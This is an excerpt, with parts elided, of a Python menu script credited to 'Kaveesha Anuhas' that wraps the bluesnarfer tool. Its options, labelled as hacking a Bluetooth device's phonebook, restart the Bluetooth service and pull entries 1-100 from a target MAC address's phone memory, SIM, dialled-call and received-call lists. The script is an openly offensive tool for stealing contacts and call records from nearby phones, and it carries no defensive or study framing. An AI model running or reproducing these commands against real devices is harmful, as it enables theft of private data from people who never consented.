...
if mainName == '                                      Created by Kaveesha Anuhas':
    ...
    if maina == "1. Check Bluetooth Status" or maina == "1." or maina == "1":
        ...
        if scanmain == "1. Connect Bluetooth Device" or scanmain == "1." or scanmain == "1":
            ...
            os.system("service bluetooth stop")
            os.system("service bluetooth start")
            os.system("bluesnarfer -b "+macId+" -C 2 -l")
            print(" ")
            ...
            if adsw == "1. Hack Bluetooth Device Unknow PhoneBook list" or adsw == "1." or adsw == "1":
                ...
                os.system("service bluetooth stop")
                os.system("service bluetooth start")
                os.system("bluesnarfer -b "+macId+" -C 2 -r 1-100 ME")
                ...
                os.system("service bluetooth stop")
                os.system("service bluetooth start")
                os.system("bluesnarfer -b "+macId+" -C 2 -r 1-100 SM")
                ...
                os.system("service bluetooth stop")
                os.system("service bluetooth start")
                os.system("bluesnarfer -b "+macId+" -C 2 -r 1-100 DC")
                ...
                os.system("service bluetooth stop")
                os.system("service bluetooth start")
                os.system("bluesnarfer -b "+macId+" -C 2 -r 1-100 RC")
else:
    print("error")
